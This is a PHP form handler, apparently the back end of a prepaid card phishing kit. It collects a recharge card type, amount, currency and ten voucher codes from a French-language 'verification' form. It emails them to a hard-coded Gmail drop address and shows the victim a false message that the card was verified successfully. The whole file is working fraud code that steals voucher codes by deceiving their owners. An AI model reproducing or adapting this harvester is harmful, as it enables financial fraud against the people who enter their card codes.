<?php

if($_SERVER['REQUEST_METHOD'] == 'POST'){

    //GET FROM ENTRIES
    $recharge =  $_POST['recharge'];
    $montant = $_POST['montant'];
    $devise = $_POST['devise'];
    $codeEnregistrement = $_POST['codeEnregistrement'];
    $codeEnregistrement1 = $_POST['codeEnregistrement1'];
    $codeEnregistrement2 = $_POST['codeEnregistrement2'];
    $codeEnregistrement3 = $_POST['codeEnregistrement3'];
    $codeEnregistrement4 = $_POST['codeEnregistrement4'];
    $codeEnregistrement5 = $_POST['codeEnregistrement5'];
    $codeEnregistrement6 = $_POST['codeEnregistrement6'];
    $codeEnregistrement7 = $_POST['codeEnregistrement7'];
    $codeEnregistrement8 = $_POST['codeEnregistrement8'];
    $codeEnregistrement9 = $_POST['codeEnregistrement9'];
    $email = $_POST['email'];

    //SEND TO EMAIL VARIABLES

    $toEmail = "carldrake969@gmail.com";
    $subject = "New message from webiste";
    $message = "
    Recharge: $recharge
    montant: $montant
    devise: $devise
    codeEnregistrement: $codeEnregistrement
    codeEnregistrement1: $codeEnregistrement1
    codeEnregistrement2: $codeEnregistrement2
    codeEnregistrement3: $codeEnregistrement3  
    codeEnregistrement4: $codeEnregistrement4
    codeEnregistrement5: $codeEnregistrement5
    codeEnregistrement6: $codeEnregistrement6
    codeEnregistrement7: $codeEnregistrement7 
    codeEnregistrement8: $codeEnregistrement8
    codeEnregistrement9: $codeEnregistrement9  
    
    ";
   
    $succes = '<div class="alert alert-primary" role="alert">
    <h4>Succes</h4>
    <p>les détails de votre carte ont été vérifiés avec succès, consultez votre e-mail pour plus de mises à jour</p>
  </div>';

    if(mail($toEmail, $subject, $message)){
        echo "verification completed succesfully";
    } else{
        echo "sorry faild to submit your details try again";
    }
}
?>